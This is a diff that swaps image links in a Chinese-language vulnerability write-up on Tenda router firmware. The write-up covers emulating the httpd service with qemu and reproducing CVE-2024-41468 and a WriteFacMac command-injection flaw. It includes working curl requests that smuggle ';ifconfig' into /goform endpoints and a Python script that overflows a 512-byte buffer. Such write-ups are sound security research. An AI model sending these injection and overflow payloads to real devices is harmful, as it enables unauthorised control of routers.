@@ -113,7 +113,7 @@ $ sudo apt install qemu-user-static  # debian,ubuntu$ sudo yum install qemu-user
 $ cd squashfs-root/$ cp $(which qemu-mipsel-static) ./$ sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZW5PSRGic9qO1twlfWFicRSANV9MiclZ2xbVzLicZibzZyqFIpaCicln5HfPw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/bb1ac07e6e9a18bfc832e676181974f06bfc57dc673927bce274f9aff8e7f938.png "")  
   
 图1 尝试启动httpd服务  
   
@@ -125,7 +125,7 @@ $ cd squashfs-root/$ cp $(which qemu-mipsel-static) ./$ sudo chroot ./ ./qemu-mi
  搜索关键字 Welcome  
 。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZqINHKwBysjxDThc1gwwAZrQsAt5JORzKzBjZkibcejQYv8qQF8sXHag/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/3f63ba26dee48ecedbdacd4977fae59d100c1857de5f368a217a6ead072c319b.png "")  
   
 图  
 2 搜索关键字  
@@ -135,7 +135,7 @@ Ctrl+x
  交叉引用看到汇编代码后再 F5  
  反编译看看代码大概逻辑。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZrtaAhLpD9wic8LeH0xlMC8RxRTyGFCzicvJ4ocvHIC99e5nU1r8QPgpA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/265ff6744c0bb436971ac107751d53fae3e1bda33b524d6cf63e6c1048912ca4.png "")  
   
 图3 反汇编源码  
   
@@ -145,7 +145,7 @@ Ctrl+x
   
 再通过汇编代码看看执行逻辑：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZf0dpZicQmPH5bRM6cqqV3picRKx09uUKOH0KLUo9CqJ03aL9m1C2m5iaw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/b1d867865a509653a217d89ca4af83f8b597707f938bf663f4755c7bef88240d.png "")  
   
 图4 汇编源码  
 ```
@@ -167,9 +167,9 @@ addiu $v0, $fp, 0xE0+var_34:    计算v0的值，这里v0指向变量v7。move $
  提供的 Edit->Patch program->change byte  
  更改鼠标指针处的字节：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZibpZZj4WXR1FBdrCQe7Uoh9BFpPhtg2JlaDPyek1Fzo4OiaHuOF5Fu3Q/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/15653b8c4b59a356a4df57d7bcd12636538d6e1480815ed1a21011f78b68e499.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZib2hTjALYU80hEuapsYFG2wpKvkc9AWgibBnyjgSYYjtRk49sY7e6nOA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/03c9762db07095410db5e1775ed01b9d0e6db77fa734c2ac7c4b4f1303e3154e.png "")  
   
 图5 patch之后汇编代码  
   
@@ -236,7 +236,7 @@ root@debian-mipsel:~# mount -t proc /proc ./squashfs-root/procroot@debian-mipsel
 漏洞位于 WriteFacMac  
  函数中：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDRptwe2evHphhqpqRJx3CicDHDlIBs9Uc4guPhlVcS8MibmaQpZkoRibaA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/b1b07083d1a6a9fc1e3d53af2cb0ac0bf699587fc6a4ee2e3a0ad86e452accfe.png "")  
   
 图6 writeFacMac源码  
   
@@ -270,7 +270,7 @@ cfm mac 00:01:02:11:22:33; ifconfig /
 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "mac=%3Bifconfig" "http://192.168.100.2/goform/WriteFacMac"
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCD7SXTnpATpoR7MDWibBawFY2b7o2icuMVExhziapHCp6EGRlIkVRCgRuJA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/13f6932c6d3165741b4d69e584abf45b7d75f6936ca35160637d523375e7acb4.png "")  
   
 图7 漏洞复现  
 ### 3.2 CVE-2024-41468  
@@ -278,7 +278,7 @@ curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "mac=%3Bifc
 漏洞位于 exeCommand  
  函数中：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDCCU4nlBcQMwFpAjTtibdibS7yesFgJUa43r2iaW2h6iahFcjvNbXGPAMUw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/cf75ffc491529524a8d501df78f52f07a22f25ae7214c8d318531cd7ef865400.png "")  
   
 图8 exeCommand源码  
   
@@ -313,7 +313,7 @@ ls; ifconfig /
 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cmdinput=ifconfig%3B" "http://192.168.100.2/goform/exeCommand"
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDFAOocwDszmMaia7GjLZlTaAsV7vrGEQoFqjzfz11rVVicCzc1Hf3QwJw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/109ef16579a14ec0466b534f6f3918d4c6b6e8739b0c4ee7af55031627384f30.png "")  
   
 图9 漏洞复现  
   
@@ -333,7 +333,7 @@ strcpy(v7, src);
 import requestsip = '192.168.100.2'url = f"http://{ip}/goform/exeCommand"long_input = 'A' * 600  # 600 字节的字符串，会溢出 512 字节的缓冲区data = {    "cmdinput": long_input}ret = requests.post(url=url, data=data)print(ret.text)
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDuYv6liaToEUmbBoSpvSePicnaVK88LK04MLtLy3uEiciaAbfwSWfjBY7Xw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/ecb61c5c77d98fe13e3b80c82cb3a3ae8401884b2341880120cf53006e7d67b5.png "")  
   
 图10 溢出漏洞复现  
   
@@ -367,16 +367,16 @@ https://www.tendacn.com/download/detail-3322.html
 https://people.debian.org/~aurel32/qemu/  
   
   
-![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT0mSRTxbY7fsoLUFViaxk1nhQByibgTdbwbMqNibWMKbHKrjwUUY8GNZlAoUlcic5ibVhyCebVwoNialnow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "404 logo-b04.png")  
+![](../../.resource/remote/b625135bbd87b3f404f32587af667f69d01ea46d33b06ce59cf3dbc300241dc9.png "404 logo-b04.png")  
   
   
 **作者名片******  
   
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3k9IT3oQhT08ulCnf45Ribl11R9xjbJ08VcW5H4Kf8ABHweWAKuhbOuZUFJ1cGTjNSxp0fljJq0Q173mG89H0ng/640?wx_fmt=jpeg&from=appmsg "")  
+![](../../.resource/remote/920711dacf431acdf6eb6c6f96daa4c9f0fd758ba077fd1ffd9319ecf6717e4c.jpg "")  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xiarRicG97E3oEcibNSrgdGSsdicWibkc8ycazhQiaA81j3o0cvzR5x4kRIcQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
+![](../../.resource/remote/0ec3d2e970617b231bf3f09ccad3daca48f94c6a76eb40009fd8b0d6dd138417.gif "")  
   
 **往 期 热 门******  
   
@@ -386,7 +386,7 @@ https://people.debian.org/~aurel32/qemu/
 [](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650979054&idx=1&sn=96d7f5468653a8659ed59b70e6ca937d&chksm=8079f8dcb70e71ca4666c228b00e54df3143338795757239b58f3455bab2dc81495aea02eecb&scene=21#wechat_redirect)  
 [](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650979510&idx=1&sn=15bbbb3f6dcd4ffac9a1ac00ed1de042&chksm=8079fe84b70e7792ec592efa376522b6c235ecd3985cfba7914ea044fb867529bf0a97e5c7d5&scene=21#wechat_redirect)  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT3XlD8Odz1EaR5icjZWy3jb8ZZPdfjQiakDHOiclbpjhvaR2icn265LYMpu3CmR1GoX707tWhAVsMJrrQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
+![](../../.resource/remote/53ae67ca79c9a2422ea2e38e0ee3f05d07bfeb4c69c90b406949962917ec18f0.gif "")  
   
 戳  
 “阅读原文”  
